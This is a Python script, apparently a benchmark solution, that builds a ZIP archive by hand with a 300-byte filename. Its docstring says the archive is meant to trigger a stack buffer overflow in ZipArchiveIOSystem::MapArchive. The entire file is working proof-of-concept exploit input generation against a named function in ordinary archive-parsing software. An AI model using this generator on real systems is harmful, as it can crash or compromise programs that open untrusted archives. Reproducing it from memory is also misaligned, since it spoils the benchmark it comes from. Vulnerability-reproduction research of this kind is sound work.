import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a ZIP archive with a filename longer than 256 bytes to trigger
        the stack buffer overflow in ZipArchiveIOSystem::MapArchive.
        """

        # Long filename to overflow a 256-byte stack buffer
        filename = b"A" * 300  # > 256
        extra = b""
        filedata = b""  # empty file

        # Signatures
        LOCAL_FILE_HEADER_SIG = 0x04034B50
        CENTRAL_DIR_HEADER_SIG = 0x02014B50
        EOCD_SIG = 0x06054B50

        # Common header fields
        version_needed = 20  # v2.0
        general_flag = 0
        compression_method = 0  # stored (no compression)
        last_mod_time = 0
        last_mod_date = 0
        crc32 = 0
        compressed_size = len(filedata)
        uncompressed_size = len(filedata)
        fname_len = len(filename)
        extra_len = len(extra)

        # Local file header
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            LOCAL_FILE_HEADER_SIG,
            version_needed,
            general_flag,
            compression_method,
            last_mod_time,
            last_mod_date,
            crc32,
            compressed_size,
            uncompressed_size,
            fname_len,
            extra_len,
        )

        local_record = local_header + filename + extra + filedata
        local_header_offset = 0  # at start of file

        # Central directory file header
        version_made_by = 20
        file_comment_len = 0
        disk_num_start = 0
        internal_attr = 0
        external_attr = 0
        rel_offset_lh = local_header_offset

        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            CENTRAL_DIR_HEADER_SIG,
            version_made_by,
            version_needed,
            general_flag,
            compression_method,
            last_mod_time,
            last_mod_date,
            crc32,
            compressed_size,
            uncompressed_size,
            fname_len,
            extra_len,
            file_comment_len,
            disk_num_start,
            internal_attr,
            external_attr,
            rel_offset_lh,
        )

        central_dir = central_header + filename + extra

        cd_offset = len(local_record)
        cd_size = len(central_dir)

        # End of central directory record
        disk_num = 0
        cd_start_disk = 0
        entries_on_disk = 1
        total_entries = 1
        comment_len = 0

        eocd = struct.pack(
            "<IHHHHIIH",
            EOCD_SIG,
            disk_num,
            cd_start_disk,
            entries_on_disk,
            total_entries,
            cd_size,
            cd_offset,
            comment_len,
        )

        zip_data = local_record + central_dir + eocd
        return zip_data